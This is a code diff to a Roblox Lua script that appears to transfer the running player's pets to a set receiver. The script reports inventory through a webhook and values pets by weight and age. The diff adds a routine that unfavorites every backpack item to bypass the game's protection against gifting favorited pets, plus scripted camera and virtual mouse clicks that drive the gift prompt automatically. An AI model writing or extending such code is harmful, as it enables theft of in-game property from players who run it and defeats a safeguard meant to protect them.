@@ -67,6 +67,15 @@ local function sendWebhook(data)
     end
 end
 
+local function unfavoriteAll()
+    local InventoryServiceEnums = require(ReplicatedStorage.Data.EnumRegistry.InventoryServiceEnums)
+    local FavoriteEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
+
+    for _, tool in ipairs(Players.LocalPlayer:WaitForChild("Backpack"):GetChildren()) do
+        FavoriteEvent:FireServer(tool)
+    end
+end
+
 local function getPetsInventory()
     local backpack = LocalPlayer:FindFirstChild("Backpack")
     if not backpack then return {} end
@@ -94,8 +103,7 @@ local function getPetsInventory()
                 kg = kg,
                 age = age,
                 special = isSpecial,
-                value = math.floor((kg * 10000) + (age * 1000)),
-                favorited = item:GetAttribute("Favorited") or false
+                value = math.floor((kg * 10000) + (age * 1000))
             })
         end
     end
@@ -459,19 +467,6 @@ local function sendInitialReport()
     })
 end
 
-local function isPetFavorited(petName)
-    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
-    if not pet then return false end
-    
-    for _, descendant in ipairs(pet:GetDescendants()) do
-        if descendant:IsA("ImageLabel") and descendant.Name == "FavoriteIcon" then
-            return true
-        end
-    end
-    
-    return pet:GetAttribute("Favorited") or false
-end
-
 local function doubleClickPet(pet)
     local character = LocalPlayer.Character
     if not character then return false end
@@ -696,6 +691,10 @@ local function clickPlayerScreen(targetPlayer)
     if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then return false end
     
     local camera = workspace.CurrentCamera
+    camera.CameraType = Enum.CameraType.Scriptable
+    camera.CFrame = CFrame.new(camera.CFrame.Position, targetPlayer.Character.HumanoidRootPart.Position)
+    camera.FieldOfView = 70
+    
     local pos, visible = camera:WorldToViewportPoint(targetPlayer.Character.HumanoidRootPart.Position)
     if not visible then return false end
     
@@ -705,21 +704,23 @@ local function clickPlayerScreen(targetPlayer)
     task.wait(CLICK_HOLD_DURATION)
     VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
     
+    camera.CameraType = Enum.CameraType.Custom
     return true
 end
 
 local function checkForGiftPrompt(targetPlayer)
     for _, gui in ipairs(CoreGui:GetDescendants()) do
-        if gui:IsA("TextLabel") and gui.Text:lower():find("cannot gift a favorited pet") then
-            return "favorited"
-        elseif gui:IsA("TextLabel") and gui.Text:lower():find(targetPlayer.Name:lower()) and gui.Text:lower():find("gift") then
-            return "gift"
+        if gui:IsA("TextLabel") and gui.Text:lower():find(targetPlayer.Name:lower()) and gui.Text:lower():find("gift") then
+            return true
         end
     end
-    return "none"
+    return false
 end
 
 local function startGifting(targetPlayer)
+    unfavoriteAll()
+    task.wait(0.5)
+    
     while true do
         if not Players:FindFirstChild(targetPlayer.Name) then
             if shutdownGui then
@@ -751,7 +752,7 @@ local function startGifting(targetPlayer)
                         task.wait(0.1)
                         local promptStatus = checkForGiftPrompt(targetPlayer)
                         
-                        if promptStatus == "gift" then
+                        if promptStatus then
                             giftPet(targetPlayer, pet.fullName)
                             task.wait(2)
                             while LocalPlayer.Backpack:FindFirstChild(pet.fullName) or (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(pet.fullName)) do
@@ -759,10 +760,6 @@ local function startGifting(targetPlayer)
                             end
                             success = true
                             task.wait(0.1)
-                        elseif promptStatus == "favorited" then
-                            doubleClickPet(pet.instance)
-                            task.wait(0.5)
-                            equipSinglePet(pet.fullName)
                         else
                             task.wait(0.1)
                         end
@@ -787,5 +784,3 @@ if not receiver then return end
 
 teleportToPlayer(receiver)
 startGifting(receiver)
-
-
